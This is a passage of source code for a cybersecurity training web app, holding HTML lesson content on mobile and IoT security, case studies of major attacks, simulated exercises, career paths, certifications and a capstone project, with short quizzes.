                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Train a machine learning model to detect phishing emails.</li>
                                <li>Use deepfake detection software to identify AI-generated media.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 4: Mobile Security & IoT Security',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Learn about Android & iOS Security Analysis techniques.</li>
                                <li>Understand how to secure IoT devices against cyber threats.</li>
                                <li>Implement best practices for mobile and IoT security in real-world scenarios.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Android & iOS Security Analysis',
                        content: `
                            <h4 class="font-bold">Mobile Security Challenges</h4>
                            <ul class="pl-6 mb-6">
                                <li>Unsecured Wi-Fi Connections – Man-in-the-middle (MITM) attacks.</li>
                                <li>Malware & Spyware – Phishing, trojans, keyloggers targeting mobile users.</li>
                                <li>Unpatched Vulnerabilities – Outdated apps and OS exposing security flaws.</li>
                                <li>Weak Authentication Mechanisms – Lack of biometric or MFA protection.</li>
                                <li>App Permissions Abuse – Overly permissive apps collecting excessive data.</li>
                            </ul>
                    
                            <h4 class="font-bold">Android Security Analysis</h4>
                            <ol class="pl-6 mb-6">
                                <li>Reverse Engineering Apps – Tools: MobSF, APKTool, JADX.</li>
                                <li>Static & Dynamic Analysis – Identifying security vulnerabilities.</li>
                                <li>Rooting Risks – Security implications of root access.</li>
                                <li>Android Security Best Practices – Enforcing Play Protect, secure coding.</li>
                            </ol>
                    
                            <h4 class="font-bold">iOS Security Analysis</h4>
                            <ol class="pl-6 mb-6">
                                <li>App Sandboxing & Jailbreaking – Risks and countermeasures.</li>
                                <li>iOS Security Features – Secure Enclave, Data Protection API.</li>
                                <li>Static & Dynamic Analysis – Tools: Frida, Objection, Hopper.</li>
                                <li>Code Signing & Integrity Checks – Ensuring app authenticity.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use MobSF (Mobile Security Framework) to analyze an Android or iOS app.</li>
                                <li>Perform basic reverse engineering on an APK file.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Securing IoT Devices',
                        content: `
                            <h4 class="font-bold">IoT Security Challenges</h4>
                            <ul class="pl-6 mb-6">
                                <li>Lack of Standardization – Different security protocols across devices.</li>
                                <li>Default Credentials – Many IoT devices ship with weak passwords.</li>
                                <li>Insecure Firmware – Poorly updated software vulnerable to exploits.</li>
                                <li>Data Privacy Concerns – Continuous data transmission without encryption.</li>
                                <li>Botnet Exploitation – IoT devices used in large-scale DDoS attacks.</li>
                            </ul>
                    
                            <h4 class="font-bold">Best Practices for IoT Security</h4>
                            <ol class="pl-6 mb-6">
                                <li>Change Default Credentials – Use strong, unique passwords.</li>
                                <li>Enable Network Segmentation – Isolate IoT devices from critical networks.</li>
                                <li>Regular Firmware Updates – Apply security patches as soon as they are released.</li>
                                <li>Encrypt IoT Communications – Use TLS, VPNs, and secure MQTT protocols.</li>
                                <li>Monitor & Log IoT Traffic – Detect and prevent unauthorized access.</li>
                            </ol>
                    
                            <h4 class="font-bold">IoT Security Tools</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Shodan</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Identifies exposed IoT devices on the internet</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">IoT Inspector</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Analyzes network behavior of smart devices</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Binwalk</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Extracts and analyzes IoT firmware</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Mirai-Scanner</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Detects IoT vulnerabilities exploited by botnets</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use Shodan to find and analyze exposed IoT devices.</li>
                                <li>Perform a firmware analysis using Binwalk on an IoT device.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is a major security risk for mobile devices?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) High battery consumption</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Weak app permissions</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Fast internet speeds</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is the purpose of Shodan in IoT security?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Scanning IoT devices exposed on the internet</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Encrypting IoT traffic</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Preventing phishing attacks</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is commonly used for reverse engineering Android apps?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain how sandboxing enhances mobile security.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can IoT network segmentation reduce security risks?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Perform a static analysis of an Android/iOS app using MobSF.</li>
                                <li>Scan for IoT vulnerabilities using Shodan or IoT Inspector.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 5: Cybersecurity Case Studies & Real-World Scenarios',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Analyze Notable Cyber Attacks and lessons learned from them.</li>
                                <li>Understand real-world cybersecurity failures and responses.</li>
                                <li>Participate in Simulated Cybersecurity Challenges to apply knowledge practically.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Notable Cyber Attacks & Lessons Learned',
                        content: `
                            <h4 class="font-bold">Why Study Cyber Attacks?</h4>
                            <p class="mb-4">Analyzing past cyber incidents helps organizations improve defenses, recognize attack patterns, and develop better response strategies.</p>
                    
                            <h4 class="font-bold">Famous Cyber Attacks</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. WannaCry Ransomware (2017)</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Attack Type: Ransomware spread via EternalBlue exploit.</li>
                                    <li>Impact: Affected over 200,000 computers in 150+ countries.</li>
                                    <li>Lesson Learned: Importance of patching vulnerabilities and having backups.</li>
                                </ul>
                    
                                <h5 class="font-semibold">2. SolarWinds Supply Chain Attack (2020)</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Attack Type: Nation-state attack leveraging compromised software updates.</li>
                                    <li>Impact: Affected government agencies and major corporations.</li>
                                    <li>Lesson Learned: Strengthen supply chain security and anomaly detection.</li>
                                </ul>
                    
                                <h5 class="font-semibold">3. Equifax Data Breach (2017)</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Attack Type: Exploitation of an unpatched Apache Struts vulnerability.</li>
                                    <li>Impact: Data breach exposed sensitive data of 147 million users.</li>
                                    <li>Lesson Learned: Implement strong patch management and monitoring.</li>
                                </ul>
                    
                                <h5 class="font-semibold">4. Colonial Pipeline Ransomware Attack (2021)</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Attack Type: Ransomware targeting critical infrastructure.</li>
                                    <li>Impact: Led to fuel shortages in the U.S.</li>
                                    <li>Lesson Learned: Importance of incident response planning and network segmentation.</li>
                                </ul>
                            </div>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Conduct an incident analysis report on a recent cyber attack.</li>
                                <li>Use MITRE ATT&CK framework to map the attack techniques.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Simulated Cybersecurity Challenges',
                        content: `
                            <h4 class="font-bold">What Are Simulated Cybersecurity Challenges?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Hands-on exercises that mimic real-world cyber threats.</li>
                                <li>Test your ability to detect, analyze, and respond to incidents.</li>
                            </ul>
                    
                            <h4 class="font-bold">Simulation Scenarios</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. Phishing Attack Simulation</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Identify phishing emails and malicious URLs.</li>
                                    <li>Analyze headers and metadata using email forensics tools.</li>
                                </ul>
                    
                                <h5 class="font-semibold">2. Ransomware Containment Exercise</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Simulate a ransomware infection.</li>
                                    <li>Implement incident response steps to contain the attack.</li>
                                </ul>
                    
                                <h5 class="font-semibold">3. Web Application Penetration Test</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Test a vulnerable web application using Burp Suite.</li>
                                    <li>Identify SQL Injection, XSS, and CSRF vulnerabilities.</li>
                                </ul>
                    
                                <h5 class="font-semibold">4. Network Traffic Analysis</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Capture and analyze network traffic using Wireshark.</li>
                                    <li>Detect anomalies and potential cyber threats.</li>
                                </ul>
                            </div>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Participate in a CTF (Capture The Flag) challenge to solve cybersecurity puzzles.</li>
                                <li>Use Kali Linux tools to perform penetration testing exercises.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What was the primary exploit used in the WannaCry attack?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) SQL Injection</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) EternalBlue</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Phishing Email</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is a key takeaway from the SolarWinds attack?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Firewalls can prevent all cyber attacks</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Supply chain security is critical</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Antivirus software can stop zero-day attacks</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What tool is commonly used for network traffic analysis?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the significance of patch management in cybersecurity.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can organizations defend against supply chain attacks?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Analyze a malicious email sample for phishing indicators.</li>
                                <li>Simulate and mitigate a ransomware attack scenario.</li>
                            </ul>
                        `
                    }
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-6",
                title: 'Module 6: Career Development in Cybersecurity',
                icon: Shield,
                sections: [
                    {
                        title: 'Session 1: Cybersecurity Career Paths',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand different cybersecurity career paths and roles.</li>
                                <li>Learn about key certifications and training programs.</li>
                                <li>Identify which cybersecurity field aligns with your interests and skillset.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Cybersecurity Career Paths',
                        content: `
                            <h4 class="font-bold">Why Choose a Cybersecurity Career?</h4>
                            <ul class="pl-6 mb-6">
                                <li>High Demand – Organizations worldwide require security professionals.</li>
                                <li>High Salary Potential – Cybersecurity specialists are among the highest-paid IT professionals.</li>
                                <li>Diverse Opportunities – A broad range of career paths to choose from.</li>
                                <li>Challenging & Rewarding – Constant learning and skill improvement.</li>
                            </ul>
                    
                            <h4 class="font-bold">Top Cybersecurity Roles & Responsibilities</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Role</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Key Responsibilities</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">SOC Analyst</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Monitor, detect, and respond to security threats in real time.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Penetration Tester</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Simulate cyber-attacks to identify vulnerabilities in systems.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Security Engineer</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Design and implement security solutions for organizations.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Incident Responder</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Investigate and contain security breaches.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Forensic Analyst</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Analyze digital evidence related to cyber crimes.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Cloud Security Specialist</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Secure cloud environments (AWS, Azure, GCP).</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">CISO</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Lead cybersecurity strategy and risk management.</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Research and identify which cybersecurity role aligns with your skills and interests.</li>
                                <li>Create a roadmap to transition into your desired cybersecurity role.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Certifications & Training',
                        content: `
                            <h4 class="font-bold">Why Are Certifications Important?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Validate cybersecurity expertise and skills.</li>
                                <li>Increase employability and career growth potential.</li>
                                <li>Meet industry and compliance requirements.</li>
                            </ul>
                    
                            <h4 class="font-bold">Popular Cybersecurity Certifications</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Certification</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Focus Area</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Experience Level</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">CEH</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Ethical hacking, penetration testing</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Beginner – Intermediate</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">OSCP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Advanced penetration testing</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Intermediate – Advanced</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">CISSP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Security management, risk assessment</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Advanced</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">CompTIA Security+</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Fundamental security knowledge</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Entry-level</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">CISM</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Cybersecurity leadership & governance</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Intermediate – Advanced</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">CCSP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Cloud security, compliance</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Intermediate</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Identify which certification aligns with your career goals.</li>
                                <li>Create a study plan for obtaining a cybersecurity certification.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the primary role of a SOC Analyst?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Develop security software</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Monitor and analyze security threats</span>
                                        </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>c) Perform penetration tests</span>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">Which certification is best suited for penetration testers?</p>
                                        <div class="ml-4 mt-2">
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>a) CISSP</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>b) OSCP</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>c) CISM</span>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">What is a key responsibility of a Cloud Security Specialist?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                </ul>

                                <h4 class="font-bold">Short Answer Questions</h4>
                                <ul class="pl-6 mb-6">
                                    <li class="mb-4">
                                        <p class="font-semibold">Explain the difference between a SOC Analyst and a Penetration Tester.</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">How does obtaining a cybersecurity certification impact career opportunities?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                </ul>

                                <h4 class="font-bold">Hands-on Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Create a learning roadmap to become a SOC Analyst or Penetration Tester.</li>
                                    <li>Research job opportunities and list skills required for your chosen career path.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Session 2: Resume Building & Job Hunting',
                            content: `
                                <h4 class="font-bold">Learning Objectives</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Learn how to craft a cybersecurity-focused resume.</li>
                                    <li>Utilize LinkedIn for networking and job hunting.</li>
                                    <li>Prepare for cybersecurity job applications and interviews.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 1: How to Write a Cybersecurity Resume',
                            content: `
                                <h4 class="font-bold">Key Elements of a Cybersecurity Resume</h4>
                                <ol class="pl-6 mb-6">
                                    <li><strong>Personal Information</strong> – Name, contact details, LinkedIn profile, GitHub (if applicable).</li>
                                    <li><strong>Professional Summary</strong> – A brief introduction to skills, experience, and career goals.</li>
                                    <li><strong>Technical Skills</strong> – List cybersecurity tools, frameworks, and programming languages.</li>
                                    <li><strong>Certifications</strong> – Highlight relevant cybersecurity certifications (CEH, OSCP, CISSP, etc.).</li>
                                    <li><strong>Work Experience</strong> – List relevant jobs, internships, or personal projects.</li>
                                    <li><strong>Projects & Research</strong> – Showcase cybersecurity-related projects.</li>
                                    <li><strong>Education & Training</strong> – Include degrees, courses, and specialized training.</li>
                                    <li><strong>Soft Skills</strong> – Communication, problem-solving, teamwork.</li>
                                </ol>
                        
                                <h4 class="font-bold">Tips for an Effective Cybersecurity Resume</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Use keywords from job descriptions to optimize for Applicant Tracking Systems (ATS).</li>
                                    <li>Highlight real-world cybersecurity experience (CTF challenges, bug bounties, lab exercises).</li>
                                    <li>Quantify impact (e.g., "Reduced phishing incidents by 40% through security awareness training.").</li>
                                    <li>Keep the resume concise (1-2 pages max).</li>
                                </ul>
                        
                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Draft a cybersecurity resume and tailor it for a specific job posting.</li>
                                    <li>Use LinkedIn Resume Builder for formatting and keyword suggestions.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 2: LinkedIn Networking & Job Hunting',
                            content: `
                                <h4 class="font-bold">Optimizing Your LinkedIn Profile for Cybersecurity Jobs</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Use a professional profile picture and headline (e.g., "Cybersecurity Analyst | Ethical Hacker | Penetration Tester").</li>
                                    <li>Write a compelling summary showcasing expertise and career goals.</li>
                                    <li>List certifications and projects in the experience section.</li>
                                    <li>Post and engage with cybersecurity content to build credibility.</li>
                                    <li>Get recommendations and endorsements from peers and mentors.</li>
                                </ul>
                        
                                <h4 class="font-bold">Job Hunting Strategies on LinkedIn</h4>
                                <ol class="pl-6 mb-6">
                                    <li>Follow cybersecurity companies and job recruiters.</li>
                                    <li>Join LinkedIn groups related to cybersecurity job postings.</li>
                                    <li>Use the 'Open to Work' feature to let recruiters know you're job-seeking.</li>
                                    <li>Message hiring managers directly and express interest in specific roles.</li>
                                </ol>
                        
                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Update your LinkedIn profile to reflect cybersecurity expertise.</li>
                                    <li>Connect with at least 10 cybersecurity professionals and engage in discussions.</li>
                                    <li>Apply to 3 cybersecurity jobs using LinkedIn's Easy Apply feature.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 3: Session Assessment',
                            content: `
                                <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                                <ul class="pl-6 mb-6">
                                    <li class="mb-4">
                                        <p class="font-semibold">What is the recommended maximum length for a cybersecurity resume?</p>
                                        <div class="ml-4 mt-2">
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>a) 1-2 pages</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>b) 3-4 pages</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>c) 5+ pages</span>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">Which LinkedIn feature helps recruiters know you're looking for work?</p>
                                        <div class="ml-4 mt-2">
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>a) Premium Account</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>b) Open to Work</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>c) Skills & Endorsements</span>
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Short Answer Questions</h4>
                                <ul class="pl-6 mb-6">
                                    <li class="mb-4">
                                        <p class="font-semibold">Why is it important to quantify achievements in your resume?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">How can you effectively use LinkedIn for networking in cybersecurity?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Hands-on Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Create a cybersecurity resume and get feedback from a peer.</li>
                                    <li>Optimize your LinkedIn profile for cybersecurity roles and track engagement metrics.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Session 3: Hands-on Capstone Project',
                            content: `
                                <h4 class="font-bold">Learning Objectives</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Work on a real-world cybersecurity project.</li>
                                    <li>Conduct a simulated penetration test or incident response exercise.</li>
                                    <li>Prepare a final report and presentation of your findings.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 1: Real-world Cybersecurity Project',
                            content: `
                                <h4 class="font-bold">Project Scope Options</h4>
                                <ol class="pl-6 mb-6">
                                    <li><strong>Penetration Testing Report</strong> – Perform a security assessment on a test environment.</li>
                                    <li><strong>Incident Response Simulation</strong> – Investigate and respond to a simulated attack.</li>
                                    <li><strong>Malware Analysis Report</strong> – Analyze and document malware behavior.</li>
                                    <li><strong>Security Awareness Campaign</strong> – Design an employee cybersecurity training program.</li>
                                </ol>
                        
                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Select a capstone project topic relevant to cybersecurity.</li>
                                    <li>Plan and outline steps required to complete the project.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 2: Simulated Penetration Testing or Incident Response Exercise',
                            content: `
                                <h4 class="font-bold">Penetration Testing Steps</h4>
                                <ol class="pl-6 mb-6">
                                    <li><strong>Reconnaissance</strong> – Gather information about the target system.</li>
                                    <li><strong>Scanning & Enumeration</strong> – Identify open ports and vulnerabilities.</li>
                                    <li><strong>Exploitation</strong> – Attempt to exploit vulnerabilities.</li>
                                    <li><strong>Post-Exploitation & Reporting</strong> – Document findings and remediation steps.</li>
                                </ol>
                        
                                <h4 class="font-bold">Incident Response Steps</h4>
                                <ol class="pl-6 mb-6">
                                    <li><strong>Identification</strong> – Detect suspicious activity and confirm an incident.</li>
                                    <li><strong>Containment</strong> – Isolate affected systems to prevent further damage.</li>
                                    <li><strong>Eradication</strong> – Remove the threat and remediate vulnerabilities.</li>
                                    <li><strong>Recovery</strong> – Restore affected systems and services.</li>
                                    <li><strong>Lessons Learned</strong> – Document findings for future improvements.</li>
                                </ol>
                        
                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Perform a penetration test on a vulnerable system (e.g., Metasploitable).</li>
                                    <li>Conduct a forensic analysis on a simulated attack using Wireshark or Autopsy.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 3: Final Report & Presentation',
                            content: `
                                <h4 class="font-bold">Components of the Final Report</h4>
                                <ol class="pl-6 mb-6">
                                    <li><strong>Executive Summary</strong> – Briefly describe the project, objectives, and findings.</li>
                                    <li><strong>Technical Details</strong> – Outline steps taken, tools used, and methodologies.</li>
                                    <li><strong>Findings & Analysis</strong> – Present vulnerabilities or security gaps identified.</li>
                                    <li><strong>Recommendations & Remediation</strong> – Propose security improvements.</li>
                                    <li><strong>Conclusion</strong> – Summarize key takeaways and future improvements.</li>
                                </ol>
